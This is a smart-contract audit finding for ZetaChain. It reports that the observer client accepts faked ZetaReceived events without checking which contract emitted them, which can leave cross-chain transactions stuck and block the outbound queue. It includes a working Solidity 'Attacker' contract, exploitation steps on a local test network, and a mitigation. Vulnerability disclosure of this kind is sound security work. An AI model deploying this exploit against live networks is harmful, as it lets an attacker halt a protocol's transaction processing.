# [H] Fake `ZetaReceived` events cause the outbound cctx to remain pending resulting in a blocked outbound EVM transaction queue

## Summary
Severity: High
Chain: Smart contract
Component: 2023-11-zetachain
Published: 2023-12-17
Source: https://github.com/code-423n4/2023-11-zetachain-findings/issues/418
Type: code-finding

## Details
# Lines of code

https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L386
https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L423
https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/zetacore_observer.go#L181-L185


# Vulnerability details

## Impact

Events such as `ZetaReceived` or `ZetaReverted`, supposed to be emitted by the connector contract, can be faked by the receiver contract that is called as part of the [`onReceive`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L64-L66) or [`onRevert`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L90-L99) call.

Worst case, a cctx can be purposefully caused to remain stuck in the `PendingOutbound` state, which blocks the outbound EVM transaction queue and prevents further outbound transactions from being sent.

## Proof of Concept

The observer's EVM client confirms sent outbound transaction within the [`IsSendOutTxProcessed`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L295) function and sends the confirmation (i.e., `MsgVoteOnObservedOutboundTx` vote message) to ZetaChain to ultimately finalize and settle the cctx.

Specifically, outbound cctx's of type `CoinType_Zeta` are processed by checking the emitted events (logs) of the containing transaction. It is expected that either the `ZetaReceived` or `ZetaReverted` event is **emitted by the connector contract**.

However, in line [`386`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L386) (and following), the event's legitimacy is not verified by checking the emitter contract address.

```go
386: 	receivedLog, err := connector.ZetaConnectorNonEthFilterer.ParseZetaReceived(*vLog)
```

Internally, the [`ParseZetaReceived`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/pkg/contracts/evm/zetaconnector.non-eth.sol/zetaconnectornoneth.go#L1587-L1594) function only parses the event and makes sure the event's signature matches the expected one.

```go
func (_ZetaConnectorNonEth *ZetaConnectorNonEthFilterer) ParseZetaReceived(log types.Log) (*ZetaConnectorNonEthZetaReceived, error) {
	event := new(ZetaConnectorNonEthZetaReceived)
	if err := _ZetaConnectorNonEth.contract.UnpackLog(event, "ZetaReceived", log); err != nil {
		return nil, err
	}
	event.Raw = log
	return event, nil
}
```

Thereafter, once the first matching `ZetaReceived` event is found and parsed, the confirmation is sent to ZetaChain, and the [`for`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L376) loop is exited early via the `return` statement in line [`421`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L421). As a result, the other legitimate `ZetaReverted` event, emitted by the connector contract, is ignored.

This fake `ZetaReceived` event can be very harmful to the system if it causes the cctx to not be finalized and stuck in the `PendingOutbound` state.

Concretely, this can be achieved by using the wrong [`internalSendHash`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.base.sol#L51) value in the `ZetaReceived` event, which is used to uniquely identify the cctx. If the `internalSendHash` value does not match the cctx's index and instead, refers to a non-existent cctx, the [`MsgVoteOnObservedOutboundTx` message fails and will never be finalized](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L82-L85).

Such a cctx remains in the pending queue and will be repeatedly [picked up by observers in the `startSendScheduler` function](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/zetacore_observer.go#L143).

Finally, the impact of this vulnerability shows itself by blocking the outbound transactions due to the `MaxLookaheadNonce` check in [`zetacore_observer.go#L181-L185`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/zetacore_observer.go#L181-L185):

```go
181: const MaxLookaheadNonce = 120
182: if params.OutboundTxTssNonce > cctxList[0].GetCurrentOutTxParam().OutboundTxTssNonce+MaxLookaheadNonce {
183: 	co.logger.ZetaChainWatcher.Error().Msgf("nonce too high: signing %d, earliest pending %d", params.OutboundTxTssNonce, cctxList[0].GetCurrentOutTxParam().OutboundTxTssNonce)
184: 	break
185: }
```

At one point, the stuck cctx will be the first item in the `cctxList` (i.e., `cctxList[0]`), while the next item, at position 1, will have a nonce that is greater than the stuck cctx's nonce plus the `MaxLookaheadNonce` value.

_Basically, this lookahead nonce check acts as a throttle to limit the amount of sent outbound transactions per heartbeat (i.e., per ZetaChain block)._

Subsequently, the `break` statement in line `184` early exits the `for` loop, skipping all other cctx's in the `cctxList` and preventing them from being sent to the external chain.

### PoC

The following simple proof of concept demonstrates sending a cross-chain message and faking the `ZetaReceived` event to cause the cctx to remain pending.

1. Spin up the smoke tests for a local test environment via `make start-smoketest`
2. Setup Remix (or similar), Metamask (or similar) with the local ETH network and the **deployer** account (which has already sufficient Zeta tokens)
   - Private key: `d87baf7bf6dc560a252596678c12e41f7d1682837f05b29d411bc3f78ae2c263`
   - Address: `0xE5C5367B8224807Ac2207d350E60e1b6F27a7ecC`
3. Deploy the following `Attacker` Solidity contract to the local ETH network:

   ```solidity
   // SPDX-License-Identifier: GPL-3.0

   pragma solidity ^0.8.0;

   import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

   interface ZetaInterfaces {
       /**
       * @dev Use SendInput to interact with the Connector: connector.send(SendInput)
       */
       struct SendInput {
           /// @dev Chain id of the destination chain. More about chain ids https://docs.zetachain.com/learn/glossary#chain-id
           uint256 destinationChainId;
           /// @dev Address receiving the message on the destination chain (expressed in bytes since it can be non-EVM)
           bytes destinationAddress;
           /// @dev Gas limit for the destination chain's transaction
           uint256 destinationGasLimit;
           /// @dev An encoded, arbitrary message to be parsed by the destination contract
           bytes message;
           /// @dev ZETA to be sent cross-chain + ZetaChain gas fees + destination chain gas fees (expressed in ZETA)
           uint256 zetaValueAndGas;
           /// @dev Optional parameters for the ZetaChain protocol
           bytes zetaParams;
       }

       /**
       * @dev Our Connector calls onZetaMessage with this struct as argument
       */
       struct ZetaMessage {
           bytes zetaTxSenderAddress;
           uint256 sourceChainId;
           address destinationAddress;
           /// @dev Remaining ZETA from zetaValueAndGas after subtracting ZetaChain gas fees and destination gas fees
           uint256 zetaValue;
           bytes message;
       }

       /**
       * @dev Our Connector calls onZetaRevert with this struct as argument
       */
       struct ZetaRevert {
           address zetaTxSenderAddress;
           uint256 sourceChainId;
           bytes destinationAddress;
           uint256 destinationChainId;
           /// @dev Equals to: zetaValueAndGas - ZetaChain gas fees - destination chain gas fees - source chain revert tx gas fees
           uint256 remainingZetaValue;
           bytes message;
       }
   }

   interface ZetaConnector {
       function send(ZetaInterfaces.SendInput calldata input) external;
   }

   interface ZetaReceiver {
       function onZetaMessage(ZetaInterfaces.ZetaMessage calldata zetaMessage) external;
       function onZetaRevert(ZetaInterfaces.ZetaRevert calldata zetaRevert) external;
   }

   contract Attacker is ZetaReceiver {
       event ZetaReceived(
           bytes zetaTxSenderAddress,
           uint256 indexed sourceChainId,
           address indexed destinationAddress,
           uint256 zetaValue,
           bytes message,
           bytes32 indexed internalSendHash
       );

       ZetaConnector public connector = ZetaConnector(0x733aB8b06DDDEf27Eaa72294B0d7c9cEF7f12db9);
       IERC20 public zeta = IERC20(0xA8D5060feb6B456e886F023709A2795373691E63);

       function start(uint256 amount, uint256 gasLimit) public {
           ZetaInterfaces.SendInput memory input = ZetaInterfaces.SendInput(
               1337,
               abi.encodePacked(address(this)),
               gasLimit,
               abi.encodePacked("42"),
               amount,
               ""
           );

           zeta.transferFrom(msg.sender, address(this), amount);
           zeta.approve(address(connector), amount);

           connector.send(input);
       }

       function onZetaMessage(ZetaInterfaces.ZetaMessage calldata zetaMessage) external {
           bytes memory zetaTxSenderAddress = zetaMessage.zetaTxSenderAddress;
           uint256 sourceChainId = zetaMessage.sourceChainId;
           address destinationAddress = zetaMessage.destinationAddress;
           uint256 zetaValue = zetaMessage.zetaValue + 1;
           bytes memory message = zetaMessage.message;
           bytes32 internalSendHash = bytes32(abi.encodePacked("42")); // @audit-info Non-existent cctx index

           emit ZetaReceived(zetaTxSenderAddress, sourceChainId, destinationAddress, zetaValue, message, internalSendHash);
       }

       function onZetaRevert(ZetaInterfaces.ZetaRevert calldata zetaRevert) external {}
   }
   ```

4. Approve the `Attacker` contract as the Zeta token spender for the **deployer** (`0xE5C5367B8224807Ac2207d350E60e1b6F27a7ecC`) address. Unlimited allowance is recommended for simplicity.
5. With the **deployer** account, call the `start` function on the `Attacker` contract with the following parameters:

   - `amount`: `3133700000000000000` (i.e., `3.1337e18`)
   - `gasLimit`: `200000`

   This function initiates a cross-chain message, however, for simplicity the cross-chain message is sent to the same chain as it originates, i.e., the local ETH network with the chain id `1337`. The `Attacker` contract is the receiver and will emit a fake `ZetaReceived` event ([imitating the `ZetaConnectorEth.onReceive` function's event](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/protocol-contracts/contracts/evm/ZetaConnector.eth.sol#L69)). However, this fake `ZetaReceived` event has the wrong `internalSendHash` value, which is used to identify the cross-chain cctx. As a result, [voting for the outbound cctx will fail](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/x/crosschain/keeper/keeper_cross_chain_tx_vote_outbound_tx.go#L82-L85) and the cctx remains pending.

6. The current cctx's status can be queried by accessing the `zetacore0` docker container and using the `list-cctx` command:

   ```bash
   docker exec -it zetacore0 sh
   zetacored q crosschain list-cctx
   ```

   Checking the output shows that the status of the cctx remains pending (`PendingOutbound`), even though it has been successfully sent to the receiver chain:

   ```bash
   ...snip...
   - cctx_status:
       lastUpdate_timestamp: "1702830340"
       status: PendingOutbound
       status_message: ""
     creator: zeta17q8u7exkgcacjvv934vrmdc79fgfxk2p8z577u
     inbound_tx_params:
       amount: "3133700000000000000"
       asset: ""
       coin_type: Zeta
       inbound_tx_ballot_index: 0xcff6c96cd6701b770ce653189c4e769a3d9d891780a2e135ef641b386174a1bd
       inbound_tx_finalized_zeta_height: "2270"
       inbound_tx_observed_external_height: "2678"
       inbound_tx_observed_hash: 0x1195c0861c9fc05464ccf5630ded9b03a28bccc28e8b341a351fc1469c482fba
       sender: 0xa825eAa55b497AF892faca73a3797046C10B7c23
       sender_chain_id: "1337"
       tx_origin: 0xE5C5367B8224807Ac2207d350E60e1b6F27a7ecC
     index: 0xcff6c96cd6701b770ce653189c4e769a3d9d891780a2e135ef641b386174a1bd
     ...snip...
   ```

Subsequently, the observers will repeatedly try to vote on it, but keep failing. In the end, this stuck cctx blocks the outbound transaction queue due to the maximum lookahead nonce check. As a result, no further outbound transactions are sent.

## Tools Used

Manual review

## Recommended mitigation steps

Consider carefully checking the emitter address of critical events, such as the `ZetaReceived` in [`evm_client.go#L386`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L386), the `ZetaReverted` event in [`evm_client.go#L423`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L423), and the `Withdrawn` event in [`evm_client.go#L490`](https://github.com/code-423n4/2023-11-zetachain/blob/b237708ed5e86f12c4bddabddfd42f001e81941a/repos/node/zetaclient/evm_client.go#L490).



## Assessed type

Invalid Validation
